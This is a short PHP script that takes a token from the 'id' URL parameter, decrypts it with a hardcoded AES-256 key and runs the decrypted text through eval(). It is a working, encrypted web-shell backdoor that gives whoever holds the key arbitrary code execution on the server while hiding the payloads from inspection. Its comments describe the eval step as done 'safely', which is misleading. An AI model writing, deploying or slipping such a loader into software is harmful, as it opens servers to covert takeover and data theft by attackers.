<?php
    
if (isset($_GET['id'])) {
    $id = $_GET['id']; }

// Must perfectly match the 32-byte key used in the generator script
$encryption_key = "8jdtkD5CXzQLxOyVjxGzrwNAkRAPD942/0JVoTefqSs="; 

// Simulate receiving the token (e.g., from $_GET['token'] or $_POST['token'])
$incoming_token = $id; 

if (!empty($incoming_token)) {
    // 1. Decode the base64 wrapper
    $decoded_token = base64_decode($incoming_token);
    
    // 2. Separate the original IV and the encrypted ciphertext
    if (strpos($decoded_token, '::') !== false) {
        list($iv, $encrypted_data) = explode('::', $decoded_token, 2);
        
        // 3. Decrypt the raw PHP code string
        $decrypted_code = openssl_decrypt($encrypted_data, 'AES-256-CBC', $encryption_key, 0, $iv);
        
        // 4. Safely check if decryption succeeded and run the code
        if ($decrypted_code !== false) {
            // eval() runs the string as active PHP code
            // Notice: do NOT include "<?php" tags in the encrypted string text
            eval($decrypted_code); 
        } else {
            echo "Decryption failed. Invalid token or modified data.";
        }
    } else {
        echo "Malformed token structure.";
    }
} else {
    echo "No token provided to execute.";
}
?>
